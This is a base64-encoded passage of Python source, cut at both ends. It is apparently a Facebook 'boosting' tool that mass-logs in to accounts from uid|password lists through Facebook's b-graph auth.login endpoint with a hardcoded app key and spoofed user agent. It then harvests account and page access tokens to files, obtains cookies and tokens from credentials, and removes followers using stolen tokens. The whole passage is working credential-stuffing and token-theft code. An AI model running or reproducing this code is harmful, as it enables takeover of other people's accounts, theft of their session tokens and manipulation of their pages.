zNbMG06IHtsZW4oc3VjY2Vzc19jb3VudCl9IHtleHRyYWN0X3R5cGV9KHMpIHN1Y2Nlc3NmdWxseSBleHRyYWN0ZWQuIikKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIkZpbGUgbm90IGZvdW5kOiB7YWNjb3VudHNfZmlsZX0iKQogICAgICAgIHJldHVybgoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcyBhcyB0aHJlYWQKaW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKCmZiYXYgPSBmJycne3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfScnJwpmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKZmJydiA9ICcwJwpyYW5kb21fc2VlZCA9IHJhbmRvbS5SYW5kb20oKQphZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQp1YV9iZ3JhcGggPSAnW0ZCQU4vRkI0QTtGQkFWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDY2KSkgKyAnLjAuMC4nICsgc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDQ5KSkgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTEsIDk5KSkgKyAnO0ZCQlYvJyArIHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKSArICc7JyArICdbRkJBTi9GQjRBO0ZCQVYvJyArIGZiYXYgKyAnO0ZCQlYvJyArIGZiYnYgKyAnO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMDd9O0ZCTEMvZnJfRlI7RkJSVi8nICsgZmJydiArICc7RkJDUi9Pb3JlZG9vIFROO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL01BUi1MWDFNO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKCmRlZiBsb2FkX2V4aXN0aW5nX3Rva2VucyhwYXRoX2ZpbGUpOgogICAgIiIiTG9hZCBleGlzdGluZyBhY2NvdW50cyBvciBwYWdlcyBmcm9tIHRoZSBvdXRwdXQgZmlsZS4iIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGhfZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4ge2xpbmUuc3BsaXQoJ3wnKVswXSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpfSAgIyBTZXQgb2YgZXhpc3RpbmcgdWlkcyBvciBwYWdlIGlkcwogICAgcmV0dXJuIHNldCgpCgpkZWYgYmdyYXBoX3BhZ2UodWlkLCBwdywgcGF0aF9maWxlLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3Rva2Vucyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KICAgIAogICAgaWYgdWlkIGluIGV4aXN0aW5nX3Rva2VuczoKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7d2hpdGV9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtyZWR9e3VpZH0ge2dyZWVufUFMUkVBRFkgRVhJU1RTIikKICAgICAgICByZXR1cm4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIAogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICB0b2tlbiA9IHJlc3BvbnNlWydhY2Nlc3NfdG9rZW4nXQoKICAgICAgICAgICAgIyBFeHRyYWN0IEZhY2Vib29rIFBhZ2VzIGFzc29jaWF0ZWQgd2l0aCB0aGUgYWNjb3VudCB0b2tlbgogICAgICAgICAgICBwYWdlcyA9IGV4dHJhY3RfZmJfcGFnZXModG9rZW4pCiAgICAgICAgICAgIGlmIHBhZ2VzOgogICAgICAgICAgICAgICAgZm9yIHBhZ2UgaW4gcGFnZXM6CiAgICAgICAgICAgICAgICAgICAgcGFnZV9pZCA9IHBhZ2VbJ2lkJ10KICAgICAgICAgICAgICAgICAgICBpZiBwYWdlX2lkIG5vdCBpbiBleGlzdGluZ190b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoX2ZpbGUsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7cGFnZV9pZH18e3BhZ2VbJ2FjY2Vzc1Rva2VuJ119XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSAg4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59UGFnZSBJRDoge3JlZH17cGFnZV9pZH0ge3llbGxvd31FWFRSQUNURUQgU1VDQ0VTU0ZVTExZIikKICAgICAgICAgICAgICAgICAgICAgICAgZXhpc3RpbmdfdG9rZW5zLmFkZChwYWdlX2lkKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfUlEOiAge3BhZ2VfaWR9IOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufUFMUkVBRFkgRVhJU1RTICEgIikKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSDilIDilIDilIDilIDilIA+IHtyZWR9RE9FU04nVCBIQVZFIFBBR0VTICEiKQogICAgICAgICAgICAKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie3doaXRlfXt1aWR9ICDilIDilIDilIDilIDilIA+IHtyZWR9RkFJTEVEIFRPIEVYVFJBQ1QgISAiKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltFUlJPUl0gRXJyb3IgZXh0cmFjdGluZyBhY2NvdW50OiB7dWlkfS4gUmVhc29uOiB7c3RyKGUpfSIpCgpkZWYgZXh0cmFjdF9mYl9wYWdlcyh0b2tlbik6CiAgICB1cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE4LjAvbWUvYWNjb3VudHMnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3Rva2VufScKICAgIH0KICAgIAogICAgcGFnZXNfZGF0YSA9IFtdCiAgICAKICAgIHdoaWxlIHVybDoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDA6CiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtyZXNwb25zZS50ZXh0fScpCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGZvciBwYWdlIGluIGRhdGEuZ2V0KCdkYXRhJywgW10pOgogICAgICAgICAgICBwYWdlc19kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAnaWQnOiBwYWdlLmdldCgnaWQnKSwKICAgICAgICAgICAgICAgICdhY2Nlc3NUb2tlbic6IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgIHVybCA9IGRhdGEuZ2V0KCdwYWdpbmcnLCB7fSkuZ2V0KCduZXh0JykgICMgVXBkYXRlIHRoZSBVUkwgZm9yIHRoZSBuZXh0IHJlcXVlc3QKCiAgICByZXR1cm4gcGFnZXNfZGF0YQoKZGVmIHByb3pjKGFjY291bnRzX2ZpbGUsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUpOgogICAgc3VjY2Vzc19jb3VudCA9IFtdCiAgICBleGlzdGluZ190b2tlbnMgPSBsb2FkX2V4aXN0aW5nX3Rva2Vucyh0b2tlbl9vdXRwdXRfcGF0aCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGhfcGFnZSwgdWlkLCBwdywgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdG9rZW5zKQogICAgICAgICAgICAgICAgICAgICAgIGZvciB1aWQsIHB3IGluIFthY2NvdW50LnNwbGl0KCd8JykgZm9yIGFjY291bnQgaW4gYWNjb3VudHNdXQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCgogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszNG1bU1VDQ0VTU11cMDMzWzBtOiB7bGVuKHN1Y2Nlc3NfY291bnQpfSB7ZXh0cmFjdF90eXBlfShzKSBzdWNjZXNzZnVsbHkgZXh0cmFjdGVkLiIpCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKZGVmIGV4dHJhY3Rpb24oKToKCiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMV0ge3llbGxvd31FWFRSQUNUIHtyZWR9QUNDT1VOVCIpCiAgICBwcmludChmIiAgICAge3doaXRlfVsyXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1QQUdFUyIpCiAgICBwcmludCgiICAgICBcMDMzWzE7MzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge2dyZWVufUNIT0lDRTogIikuc3RyaXAoKSAKICAgIGlmIGNob2ljZSA9PSAnMSc6CiAgICAgICAgYXhsMSgpCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgYXhsMigpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiICAgICB7cmVkfUlOVkFMSUQgQ0hPSUNFIikKZGVmIGF4bDIoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmb2xkZXJfcGF0aCA9ICIvc2RjYXJkL2Jvb3N0cGhlcmUiICAKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiICAgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICBwcm96YyhmaWxlX3BhdGgsIGFjY291bnRfZmlsZSwgZXh0cmFjdF90eXBlKQpkZWYgYXhsMSgpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZvbGRlcl9wYXRoID0gIi9zZGNhcmQvYm9vc3RwaGVyZSIKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiICAgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICB0b2tlbl9vdXRwdXRfcGF0aCA9IGFjY291bnRfZmlsZQoKICAgIHByb3ooZmlsZV9wYXRoLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKQoKZGVmIGNvb2tpZV90b2tlbigpOgogICAgY2xlYXIoKQogICAgbG9nbygpCiAgICBlbWFpbCA9IGlucHV0KCJFTUFJTCA6ICIpCiAgICBwYXNzd29yZCA9IGlucHV0KCJQQVNTV09SRCA6ICIpIAogICAgbGluZXgoKQogICAgCiAgICAjIENvcnJlY3QgZnVuY3Rpb24gY2FsbCwgZW5zdXJpbmcgYm90aCB2YWx1ZXMgYXJlIHJldHJpZXZlZAogICAgY29va2llLCB0b2tlbiA9IG5hcnV0byhlbWFpbCwgcGFzc3dvcmQpCgogICAgaWYgY29va2llOgogICAgICAgIHByaW50KGYie2dyZWVufUFDQ0VTUyBUT0tFTjoge3Rva2VufSIpCiAgICAgICAgbGluZXgoKQogICAgICAgIHByaW50KGYie2dyZWVufUNPT0tJRToge2Nvb2tpZX0iKQogICAgZWxzZToKICAgICAgICBwcmludChmIntyZWR9RkFJTEVEIFRPIE9CVEFJTiBDT09LSUUgQU5EIEFDQ0VTUyBUT0tFTi4iKQogICAgICAgIAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwoKIyBQbGFjZWhvbGRlciBmdW5jdGlvbnMgKFlvdSBuZWVkIHRvIGRlZmluZSB0aGVzZSkKZGVmIGNsZWFyKCk6CiAgICBwYXNzCgpkZWYgbG9nbygpOgogICAgcGFzcwoKZGVmIGdldF9pZHNfdG9rZW5zKGZpbGVfcGF0aCk6CiAgICAiIiIgUmVhZHMgYWNjZXNzIHRva2VucyBmcm9tIGEgZmlsZS4gIiIiCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpXQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJFcnJvcjogVG9rZW4gZmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4gW10KCmRlZiBnZXRfcHJvZmlsZV9pZCh1c2VybmFtZSwgYWNjZXNzX3Rva2VuKToKICAgICIiIiBHZXRzIHRoZSBwcm9maWxlIElEIGZyb20gdXNlcm5hbWUuICIiIgogICAgdXJsID0gZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTkuMC97dXNlcm5hbWV9IgogICAgcGFyYW1zID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW59CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIHBhcmFtcz1wYXJhbXMpCiAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpCiAgICByZXR1cm4gZGF0YS5nZXQoJ2lkJywgTm9uZSkKCmRlZiBnZXRfcHJvZmlsZV91c2VybmFtZShwcm9maWxlX2lkLCBhY2Nlc3NfdG9rZW4pOgogICAgIiIiIEdldHMgdGhlIHByb2ZpbGUgdXNlcm5hbWUgZnJvbSBJRC4gIiIiCiAgICB1cmwgPSBmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3twcm9maWxlX2lkfSIKICAgIHBhcmFtcyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnZmllbGRzJzogJ25hbWUnfQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBwYXJhbXM9cGFyYW1zKQogICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgcmV0dXJuIGRhdGEuZ2V0KCduYW1lJywgJ1Vua25vd24nKQoKZGVmIHJlbW92ZV9mYWNlYm9va19mb2xsb3dlcigpOgogICAgY2xlYXIoKQogICAgbG9nbygpCiAgICAKICAgIGFjY2Vzc190b2tlbnMgPSBnZXRfaWRzX3Rva2VucygnL3NkY2FyZC9FUlJPUi1CT09TVElORy90b2twLnR4dCcpCiAgICBpZiBub3QgYWNjZXNzX3Rva2VuczoKICAgICAgICBwcmludCgiTm8gYWNjZXNzIHRva2VucyBmb3VuZC4iKQogICAgICAgIHJldHVybgoKICAgIHByb2ZpbGVfbGluayA9IGlucHV0KCdFTlRFUiBUSEUgRkFDRUJPT0sgUFJPRklMRSBMSU5LIFRPIFJFTU9WRSBGT0xMT1dFUlMgRlJPTTogJykuc3RyaXAoKQogICAgdXNlcm5hbWUgPSBwcm9maWxlX2xpbmsuc3BsaXQoJy8nKVstMV0KICAgIHByb2ZpbGVf